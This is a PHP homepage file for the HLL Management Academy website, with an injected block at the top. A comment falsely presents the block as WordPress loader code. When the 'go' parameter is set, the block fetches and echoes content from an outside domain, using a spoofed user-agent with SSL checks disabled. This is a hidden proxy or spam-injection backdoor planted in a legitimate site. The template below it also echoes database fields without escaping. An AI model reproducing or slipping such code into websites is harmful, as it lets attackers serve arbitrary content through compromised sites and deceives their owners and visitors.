<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/hllacademy.in/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
} else {

    ?>


<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; maximum-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
    <title>HLL Academy | Home</title>

    <!-- CSS -->
    <link href="css/reset.css" rel="stylesheet">
    <link href="css/fonts.css" rel="stylesheet">
    <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/select2/css/select2.min.css" rel="stylesheet">
    <link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <link href="assets/magnific-popup/css/magnific-popup.css" rel="stylesheet">
    <link href="assets/iconmoon/css/iconmoon.css" rel="stylesheet">
    <link href="assets/owl-carousel/css/owl.carousel.min.css" rel="stylesheet">
    <link href="css/animate.css" rel="stylesheet">
    <link href="css/custom.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="js/html5shiv.min.js"></script>
        <script src="js/respond.min.js"></script>
        <![endif]-->

</head>

<body>

    <!-- ==============================================
    ** Preloader **
    =================================================== -->
    <div id="loading">
        <div class="element">
            <div class="sk-folding-cube">
                <div class="sk-cube1 sk-cube"></div>
                <div class="sk-cube2 sk-cube"></div>
                <div class="sk-cube4 sk-cube"></div>
                <div class="sk-cube3 sk-cube"></div>
            </div>
        </div>
    </div>

   <?php include('header.php') ?>
   

    <!-- ==============================================
    ** Banner Carousel **
    =================================================== -->
    <div class="banner-outer">
        <div class="banner-slider">
            <div class="slide1">
                <div class="container">
                    <div class="content animated fadeInRight">
                        <div class="fl-right">
                            <h1 class="animated fadeInRight">Welcome to <span class="animated fadeInRight">HLL Management Academy</span> </h1>
                            <p class="animated fadeInRight"></p>
                            <a href="about.php" class="btn animated fadeInRight">About Us<span class="icon-more-icon"></span></a>
                        </div>
                    </div>
                </div>
            </div>
            
                </div>
            </div>
        </div>
    </div>

    <!-- ==============================================
    ** About **
    =================================================== -->
    <section class="about">
        <div class="container">
            <ul class="row our-links">
                <li class="col-sm-4 apply-online clearfix equal-hight">
                    <div class="icon"><img src="images/certification-ico.png" class="img-responsive" alt=""></div>
                    <div class="detail">
                        <h5>Consultancy and Public health projects cell</h5>
                        <p></p>
                        <a href="/community%20development.php" class="more"><i class="fa fa-angle-right" aria-hidden="true"></i></a>
                    </div>
                </li>
                <li class="col-sm-4 prospects clearfix equal-hight">
                    <div class="icon"><img src="images/get-innovative-ico.jpg" class="img-responsive" alt=""></div>
                    <div class="detail">
                        <h5>Training and Academics Cell</h5>
                        <p></p>
                        <a href="/training%20and%20development.php" class="more"><i class="fa fa-angle-right" aria-hidden="true"></i></a>
                    </div>
                </li>
                <li class="col-sm-4 certification clearfix equal-hight">
                    <div class="icon"><img src="images/certification-ico.png" class="img-responsive" alt=""></div>
                    <div class="detail">
                        <h5>Skill Development Cell</h5>
                        <p></p>
                        <a href="/skill%20development.php" class="more"><i class="fa fa-angle-right" aria-hidden="true"></i></a>
                    </div>
                </li>
            </ul>
        </div>
        <div class="container">
            <div class="row">
                <div class="col-sm-7 col-sm-push-5 left-block"> <span class="sm-head">Welcome to</span>
                    <h2>HLL Management Academy</h2>
                    <p>HLL Management Academy, is the educational initiative of HLL Lifecare Ltd, the Public Sector Enterprise under the Ministry of Health and Family Welfare, Government of India. HMA envisions itself as a knowledge platform for individuals, institutions and communities of different knowledge needs. HMA was registered as a not-for-profit society under the Travancore Cochin Literary Scientific and Charitable Societies Registration Act 1955. HLL Lifecare Ltd, established in 1967 with the aim to cater to the country’s family planning Programme has now grown into an organization offering a wide spectrum of products and services in the healthcare domain with a strong global presence.</p>
                    <div class="know-more-wrapper"> <a href="/about.php" class="know-more">Know More <span class="icon-more-icon"></span></a> </div>
                </div>
                <div class="col-sm-5 col-sm-pull-7">
                    <div class="video-block">
                        <div id="thumbnail_container"> <img src="images/about-video.jpg" id="thumbnail" class="img-responsive" alt=""> </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </section>

 
    <section class="our-impotance padding-lg">
        <div class="container">
            <ul class="row">
                <li class="col-sm-4 equal-hight">
                    <div class="inner"> <img src="images/study-time-ico.jpg" alt="Malleable Study Time">
                        <h3>Consultancy and Public Health Projects Cell</h3>
                        <p>To see what everybody else has seen and to think what nobody else has thought- In areas of Social relevance like healthcare, education, environment and Development</p>
                    </div>
                </li>
                <li class="col-sm-4 equal-hight">
                    <div class="inner"> <img src="images/placement-ico.jpg" alt="Placement Assistance">
                        <h3>TRAINING AND ACADEMIC CELL</h3>
                        <p>Customized & Need based career enhancement program for Government, Private and not-for- profit Organizations / Departments / Companies.</p>
                    </div>
                </li>
                <li class="col-sm-4 equal-hight">
                    <div class="inner"> <img src="images/easy-access-ico.jpg" alt="Easy To Access">
                        <h3>SKILL DEVELOPMENT CELL</h3>
                        <p>A prestigious initiative by HLL Management Academy to develop Skilled Professionals and provide placement assistance to the underprivileged , unemployed youth of the state</p>
                    </div>
                </li>
              
                
            </ul>
        </div>
    </section>

   
    <!-- ==============================================
    ** Why Choose **
    =================================================== -->
    <section class="why-choose padding-lg">
        <div class="container">
            <h2><span>The Numbers Say it All</span>Why Choose Us</h2>
            <ul class="our-strength">
                <li>
                    <div class="icon"><span class="icon-certification-icon"> </span></div>
                    <div class="couter-outer"><span class="counter">100</span><span>+</span></div>
                    <div class="title">Management Development Programs</div>
                </li>
                <li>
                    <div class="icon"><span class="icon-parents-icon"></span></div>
                    <div class="couter-outer"><span class="counter">100</span><span>+</span></div>
                    <div class="title">Staff Development Programs</div>
                </li>
                <li>
                    <div class="icon"><span class="icon-book-icon"></span></div>
                    <div class="couter-outer"><span class="counter">5</span><span>+</span></div>
                    <div class="title">International Training Programs</div>
                </li>
                <li>
                    <div class="icon"><span class="icon-student-icon"></span></div>
                    <div class="couter-outer"><span class="counter">50</span><span>+</span></div>
                    <div class="title">Empanelled Faculties</div>
                </li>
            </ul>
        </div>
    </section>

    <!-- ==============================================
    ** News & Events **
    =================================================== -->
    <section class="news-events padding-lg">
        <div class="container">
            <h2><span>There are many ways to learn</span>Course Updates</h2>
            <ul class="row cs-style-3">
			
			<?php include('db_connect.php');  ?>
			
			 <?php
											$conn = mysqli_connect($servername, $username, $password, $dbname);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = "SELECT * FROM news";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {

    while($row = mysqli_fetch_assoc($result)) {
        ?>
		
		
			
                <li class="col-sm-4">
                    <div class="inner">
                        <figure> <img src="admin/uploads/<?php echo $row['image'];?>" class="img-responsive">
                            <figcaption>
                                <div class="cnt-block"> <a href="#" class="plus-icon">+</a>
                                    <h3> <?php echo $row['title'];?></h3>
									<p><?php echo $row['description'];?></p>
                                    <div class="bottom-block clearfix">
                                        <div class="date">
                                            <div class="icon"><span class="icon-calander-icon"></span></div>
                                            <span><?php echo $row['date'];?></span> 
                                        </div>
                                        
                                    </div>
                                </div>
                            </figcaption>
                        </figure>
                    </div>
                </li>
			
<?php      
}              
} else {
    echo "0 results";
}

mysqli_close($conn);
?>			
				
			
            </ul>
            <div class="know-more-wrapper"> <a href="#" class="know-more">More Post <span class="icon-more-icon"></span></a> </div>
        </div>
    </section>

    <!-- ==============================================
    ** Campus Tour **
    =================================================== -->
    <section class="campus-tour padding-lg">
        <div class="container">
            <h2><span>Our campus have a lot to offer for our students</span>TAKE A CAMPUS TOUR</h2>
        </div>
        <ul class="gallery clearfix">
     <?php
											$conn = mysqli_connect($servername, $username, $password, $dbname);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = "SELECT * FROM gallery_category LIMIT 10";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {

    while($row = mysqli_fetch_assoc($result)) {
        ?>       

		   <li>
                <div class="overlay">
                    <h3><?php echo $row['title'];?> </h3>
                    <br/>
                    <a class="galleryItem" href="admin/uploads/<?php echo $row['image'];?>"><span class="icon-enlarge-icon"></span></a>
                    <a href="gallery-view.php?id=<?php echo $row['id']?>" class="more"><span class="icon-gallery-more-arrow"></span></a>
                </div>
                <figure><img src="admin/uploads/<?php echo $row['image'];?>" class="img-responsive" alt=""></figure>
            </li>
           
		   <?php      
}              
} else {
    echo "0 results";
}

mysqli_close($conn);
?>	
		   
        </ul>
    </section>

   
    <!-- ==============================================
    ** Testimonials **
    =================================================== -->
    <section class="testimonial padding-lg">
        <div class="container">
            <div class="wrapper">
                <h2>Alumini Testimonials</h2>
                <ul class="testimonial-slide">
				
				 <?php
											$conn = mysqli_connect($servername, $username, $password, $dbname);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = "SELECT * FROM activities";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {

    while($row = mysqli_fetch_assoc($result)) {
        ?>
				
                    <li>
                        <p><?php echo $row['description'];?></p>
                        <span><?php echo $row['title'];?></span></span>
                    </li>
  
  <?php      
}              
} else {
    echo "0 results";
}

mysqli_close($conn);
?>
  
  
                </ul>
                <div id="bx-pager">
				
				 <?php
											$conn = mysqli_connect($servername, $username, $password, $dbname);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = "SELECT * FROM activities";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {

    while($row = mysqli_fetch_assoc($result)) {
        ?>
				
                    <a data-slide-index="<?php echo $row['id'];?>" ><img src="admin/uploads/<?php echo $row['image'];?>" class="img-circle" alt=""></a>


  <?php      
}              
} else {
    echo "0 results";
}

mysqli_close($conn);
?>
                </div>
            </div>
        </div>
    </section>
    

   <?php include('footer.php') ?>
   

    <!-- Scroll to top -->
    <a href="#" class="scroll-top"><i class="fa fa-chevron-up" aria-hidden="true"></i></a>

    <!-- Optional JavaScript -->
    <script src="js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="assets/select2/js/select2.min.js"></script>
    <script src="assets/matchHeight/js/matchHeight-min.js"></script>
    <script src="assets/bxslider/js/bxslider.min.js"></script>
    <script src="assets/waypoints/js/waypoints.min.js"></script>
    <script src="assets/counterup/js/counterup.min.js"></script>
    <script src="assets/magnific-popup/js/magnific-popup.min.js"></script>
    <script src="assets/owl-carousel/js/owl.carousel.min.js"></script>
    <script src="js/modernizr.custom.js"></script>
    <script src="js/custom.js"></script>
</body>

</html>

<?php
}
?>


